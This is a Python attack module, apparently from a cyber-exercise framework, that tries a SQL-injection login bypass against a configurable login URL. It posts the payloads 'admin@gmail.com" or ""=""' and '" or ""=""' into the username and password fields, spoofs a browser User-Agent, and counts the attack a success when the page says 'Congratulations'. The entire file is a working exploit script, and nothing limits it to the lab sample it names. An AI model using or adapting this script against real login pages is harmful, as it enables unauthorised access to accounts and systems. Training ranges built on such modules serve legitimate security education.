import sys

import requests

COMMAND_KEY = "command"
LOGIN_URL_KEY = "login-url"
USERNAME_INPUT_FIELD_NAME_KEY = "username-input-field"
PASSWORD_INPUT_FIELD_NAME_KEY = "password-input-field"
COMMENT_COMMAND_SUCCESS = "Command execution succeeded"
COMMENT_COMMAND_FAILURE = "Command execution failed"
COMMENT_COMMAND_BLANK = "Command is empty"
COMMENT_INPUT_FIELD_BLANK = "Input Field Name is empty"
COMMENT_LOGIN_URL_BLANK = "Login URL is empty"


class login_sql_injection:
    def check(self, action):
        return True

    def action(self, team_name, address, action, data):

        # check all parameters
        if LOGIN_URL_KEY in action:
            login_url = action[LOGIN_URL_KEY]
        else:
            return False, COMMENT_LOGIN_URL_BLANK, {}

        if USERNAME_INPUT_FIELD_NAME_KEY in action:
            username_field = action[USERNAME_INPUT_FIELD_NAME_KEY]
        else:
            return False, COMMENT_INPUT_FIELD_BLANK, {}

        if PASSWORD_INPUT_FIELD_NAME_KEY in action:
            password_field = action[PASSWORD_INPUT_FIELD_NAME_KEY]
        else:
            return False, COMMENT_INPUT_FIELD_BLANK, {}

        # User name is currently hard-coded to match the cyweb.zip sample;
        # change the lines below if needed
        user = "admin@gmail.com\" or \"\"=\"\""
        password = "\" or \"\"=\"\""
        # Data to be sent with the POST request
        login_data = {
            username_field: user,
            password_field: password
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'Sec-Fetch-Site': 'same-origin',
        }
        try:
            response = requests.get(login_url, data=login_data, headers=headers)
            # print(response)
            if response.status_code == 200 and 'Congratulations' in response.text:
                return True, COMMENT_COMMAND_SUCCESS, {}
            else:
                return False, COMMENT_COMMAND_FAILURE, {}
        except:
            return False, COMMENT_COMMAND_FAILURE, {}
